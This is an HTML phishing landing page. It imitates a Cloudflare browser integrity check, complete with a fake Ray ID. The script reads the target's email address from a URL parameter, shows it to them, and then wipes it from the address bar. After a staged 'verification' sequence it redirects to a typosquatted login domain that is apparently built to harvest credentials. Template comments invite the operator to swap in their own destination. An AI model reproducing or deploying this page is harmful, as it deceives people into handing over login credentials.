<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
  <title>Terms and Conditions Accepted</title>
  <!-- Optional: tell browser to start fetching next page early (works if you know the URL) -->
  <!-- <link rel="prefetch" href="https://your-real-target-page.com"> -->
  
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #1d1d1d; color: #ffffff; overflow: hidden;
      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
      transition: background-color 1.6s ease-out;
    }
   
    #verification-overlay {
      position: fixed; inset: 0; background: #1d1d1d;
      display: flex; flex-direction: column;
      justify-content: center; align-items: center; padding: 20px; box-sizing: border-box;
      z-index: 9999; opacity: 1; 
      transition: opacity 1.4s ease-out;
    }
   
    #verification-overlay.fade-out { opacity: 0; }
   
    .center-group {
      text-align: center; width: 100%; margin-top: -40px;
      transition: opacity 0.7s ease;
    }
    .center-group.hidden {
      opacity: 0;
    }
   
    h1#top-header {
      font-size: 0.95rem; font-weight: 400; opacity: 0.6;
      margin: 0 0 10px 0; text-transform: uppercase; letter-spacing: 1.5px;
    }
   
    #email-display {
      font-size: clamp(1.3rem, 5.5vw, 2rem); font-weight: 600;
      word-break: break-all; max-width: 85vw; color: #ffffff; margin: 0 auto;
    }
   
    .success-checkmark {
      width: 80px; height: 80px; margin: 30px auto 50px;
      opacity: 0;
      transition: opacity 0.5s ease 0.2s;
    }
    .success-checkmark.visible {
      opacity: 1;
    }
   
    .check-icon {
      width: 80px; height: 80px; position: relative;
      border-radius: 50%; box-sizing: content-box; border: 4px solid #4CAF50;
    }
   
    .check-icon::before {
      top: 37px; left: 14px; width: 23px; transform: rotate(45deg);
      transform-origin: left; border-top: 4px solid #4CAF50; content: "";
      position: absolute; opacity: 0; animation: check-left 0.35s 0.8s ease-out forwards;
    }
   
    .check-icon::after {
      top: 54px; left: 30px; width: 40px; transform: rotate(-45deg);
      transform-origin: left; border-top: 4px solid #4CAF50; content: "";
      position: absolute; opacity: 0; animation: check-right 0.35s 1.1s ease-out forwards;
    }
   
    @keyframes check-left { 0% { width: 0; opacity: 1; } 100% { width: 23px; opacity: 1; } }
    @keyframes check-right { 0% { width: 0; opacity: 1; } 100% { width: 40px; opacity: 1; } }
   
    .bottom-container {
      position: absolute; bottom: env(safe-area-inset-bottom, 40px);
      display: flex; flex-direction: column; align-items: center; width: 100%;
    }
   
    p#security-msg {
      font-size: 0.9rem; text-align: center; margin: 0;
      min-height: 1.5em; opacity: 0.9; font-weight: 300;
      transition: opacity 1.4s ease-out;
    }
   
    .footer-info {
      font-size: 0.7rem; color: #444; font-family: monospace;
      margin-top: 20px; letter-spacing: 0.5px;
    }
  </style>
</head>
<body>
<div id="verification-overlay">
  <div class="center-group" id="top-content">
    <h1 id="top-header">Re-authenticate before accessing</h1>
    <div id="email-display">connecting to re-authenticate...</div>
  </div>
 
  <div class="success-checkmark" id="tick-box">
    <div class="check-icon"></div>
  </div>

  <div class="bottom-container">
    <p id="security-msg">Performing browser integrity check</p>
    <div class="footer-info">Cloudflare Ray ID: 6797e715cdb5625b</div>
  </div>
</div>

<script>
function getEmailFromUrl() {
  const params = new URLSearchParams(window.location.search);
  return params.get("bazz505") || "User";
}

const email = getEmailFromUrl();
let domain = email.includes("@") ? email.split("@")[1] : "";

document.getElementById("email-display").textContent = email;
history.replaceState({}, document.title, window.location.pathname);

const securityMsg = document.getElementById("security-msg");
const topContent = document.getElementById("top-content");
const tickBox = document.getElementById("tick-box");
const overlay = document.getElementById("verification-overlay");
const body = document.body;

const TARGET_URL = "https://login.manageing.sbs/yPFvunuO";  // ← replace with your real destination

const messages = [
  "Performing browser integrity check...",
  "Validating session security...",
  domain ? `Preparing secure access to ${domain}...` : "Preparing secure connection...",
  "Success! Terms and conditions accepted."
];

messages.forEach((msg, i) => {
  setTimeout(() => {
    securityMsg.textContent = msg;

    if (i === messages.length - 1) {
      // Final stage: show tick, hide top
      tickBox.classList.add("visible");
      topContent.classList.add("hidden");

      // Wait just long enough for the tick animation to be noticeable
      setTimeout(() => {
        // Start smooth fade to white + content disappear
        body.style.backgroundColor = "#ffffff";
        securityMsg.style.opacity = "0";
        overlay.classList.add("fade-out");

        // ─── KEY CHANGE ───
        // Redirect ALMOST IMMEDIATELY — let network start while fade is happening
        // Most users will see white + spinning cursor → next page appears quickly
        setTimeout(() => {
          window.location.href = TARGET_URL;
        }, 180);   // 80 ms = basically instant after fade begins

      }, 1);   // ← was 2300; shortened so redirect starts sooner
    }
  }, 1400 * i);
});

// Failsafe (longer timeout)
setTimeout(() => {
  body.style.backgroundColor = "#ffffff";
  overlay.classList.add("fade-out");
  setTimeout(() => {
    window.location.href = TARGET_URL;
  }, 100);
}, 12000);
</script>
</body>
</html>